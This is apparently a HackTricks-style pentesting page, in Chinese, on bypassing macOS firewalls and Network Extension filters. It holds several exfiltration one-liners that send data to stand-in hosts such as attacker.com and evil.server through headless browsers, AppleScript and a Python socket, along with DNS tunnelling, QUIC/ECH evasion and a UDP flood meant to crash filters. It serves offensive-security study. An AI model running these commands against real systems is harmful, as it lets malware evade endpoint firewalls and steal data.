# macOS 绕过防火墙

{{#include ../../banners/hacktricks-training.md}}

## 已发现的技术

以下技术已被发现可在某些 macOS 防火墙应用中正常工作。

### 滥用白名单名称

- 例如，使用知名 macOS 进程的名称（如 **`launchd`**）来调用 malware

### Synthetic Click

- 如果防火墙向用户请求权限，让 malware **点击 allow**

### **使用 Apple 签名的二进制文件**

- 例如 **`curl`**，以及其他工具，如 **`whois`**

### 知名 Apple 域名

防火墙可能允许连接到知名的 Apple 域名，例如 **`apple.com`** 或 **`icloud.com`**。此外，还可以使用 iCloud 作为 C2。

### 通用绕过

一些可尝试用来绕过防火墙的思路

### 检查允许的流量

了解允许的流量有助于识别潜在的白名单域名，或确定哪些应用程序被允许访问这些域名
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

在 macOS 上，进程**不会**自行与 DNS server 通信。名称解析通过 **XPC** 由 **`mDNSResponder`**（`/usr/sbin/mDNSResponder`）代理；它是一个由 Apple 签名的系统 daemon，因此机器上的每次查询都会以**来自 `mDNSResponder` 的流量**离开主机，而不是以发起查询的进程身份离开。防火墙因此通常会无条件信任该 daemon——拒绝它会导致整个系统的名称解析中断。<sup>[1]</sup>

这使 DNS 成为一种即使防火墙阻止了 malware 自身的 sockets，仍然保持开放的 channel：<sup>[1]</sup>

1. malware 尝试连接 `evil.com`。它**自身**的出站连接会被防火墙检查并**阻止**。
2. malware 改为通过 XPC 请求 `mDNSResponder` **解析** `evil.com`。
3. 防火墙检查生成的查询，看到发起者是受信任且由 Apple 签名的 resolver，于是**允许**该查询。
4. 查询抵达 DNS server——如果攻击者运行 `evil.com` 的 authoritative server，那么通信双方都由攻击者控制。

由于攻击者拥有该 zone，完全不需要建立任何“连接”：数据会被隐藏在**查询的 labels**中（例如 `<encoded-chunk>.evil.com`），命令则通过**响应 records**（TXT、A、CNAME……）返回。这就是经典的 DNS tunnelling，借助一个已被完全列入 allowlist 的进程传输数据。

任何 unprivileged process 都可以直接驱动该 daemon，这是确认该路径是否开放的一种简单方法：
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### 通过浏览器应用

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 通过进程注入

如果你可以**将代码注入**到一个被允许连接任意服务器的进程中，就可以绕过 firewall 防护：


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 近期 macOS firewall bypass 漏洞（2023-2025）

### Web content filter（Screen Time）绕过 - **CVE-2024-44206**
2024 年 7 月，Apple 修复了 Safari/WebKit 中的一个严重漏洞。该漏洞会破坏 Screen Time parental controls 使用的系统级“Web content filter”。

经过特殊构造的 URI（例如包含双重 URL-encoded 的“://”）不会被 Screen Time ACL 识别，但会被 WebKit 接受，因此请求会在未经过 filter 的情况下发出。这样，任何能够打开 URL 的进程（包括 sandboxed 或 unsigned code）都可以访问用户或 MDM profile 明确屏蔽的 domains。<sup>[2]</sup>

实际测试（未打补丁的系统）：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 早期 macOS 14 “Sonoma” 中的 Packet Filter (PF) 规则顺序 bug
在 macOS 14 beta 周期内，Apple 在用户空间中围绕 **`pfctl`** 的 wrapper 引入了一个 regression。  
使用 `quick` keyword 添加的规则（许多 VPN kill-switch 都会使用）会被静默忽略，即使 VPN/firewall GUI 报告为 *blocked*，也会导致 traffic leaks。多个 VPN vendor 确认了该 bug，并已在 RC 2（build 23A344）中修复。

快速 leak-check：
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### 滥用 Apple 签名的 helper services（legacy – macOS 11.2 之前）
在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许约 50 个 Apple binaries（例如 **`nsurlsessiond`** 和 App Store）绕过所有使用 Network Extension framework 实现的 socket-filter firewalls（LuLu、Little Snitch 等）。
Malware 只需启动一个被排除的进程，或向其中注入 code，即可通过已获允许的 socket 隧道传输自身流量。Apple 在 macOS 11.2 中完全移除了 exclusion list，但该 technique 对无法升级的系统仍然适用。<sup>[3]</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### 使用 QUIC/ECH 规避 Network Extension 域名过滤器（macOS 12+）
NEFilter Packet/Data Providers 依赖 TLS ClientHello 中的 SNI/ALPN。通过 **基于 QUIC 的 HTTP/3（UDP/443）** 和 **Encrypted Client Hello（ECH）**，SNI 始终处于加密状态，NetExt 无法解析该流量，主机名规则通常会 fail-open，使 malware 无需接触 DNS 即可访问被阻止的域名。<sup>[5]</sup>

最小 PoC：
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
如果仍启用 QUIC/ECH，这是一条轻松绕过 hostname-filter 的路径。

### macOS 15 “Sequoia” Network Extension 不稳定性（2024–2025）
早期的 15.0/15.1 构建版本会导致第三方 **Network Extension** filters（LuLu、Little Snitch、Defender、SentinelOne 等）崩溃。filter 重启时，macOS 会丢弃其 flow rules，许多产品会 fail-open。向 filter Flood 数千个短 UDP flows（或强制使用 QUIC/ECH）可能反复触发崩溃，并在 GUI 仍显示 firewall 正在运行时，为 C2/exfil 留下窗口。<sup>[4]</sup>

快速复现（安全的 lab box）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 现代 macOS 的工具使用提示

1. 检查 GUI 防火墙生成的当前 PF 规则：
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 枚举已经持有 *outgoing-network* entitlement 的二进制文件（适用于 piggy-backing）：
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. 使用 Objective-C/Swift 以编程方式注册自己的 Network Extension content filter。
Patrick Wardle 的 **LuLu** 源代码中提供了一个将数据包转发到本地 socket 的最小 rootless PoC。

## 参考资料

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice：构建和攻破 macOS 防火墙](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass 允许不受限制地访问被阻止的内容（CVE-2024-44206）- Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple 移除允许 App 绕过防火墙安全机制的 macOS 功能 - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [macOS Sequoia 更新后 Cybersecurity Products Conking Out - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [使用 network protection 帮助阻止 macOS 连接恶意网站 - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
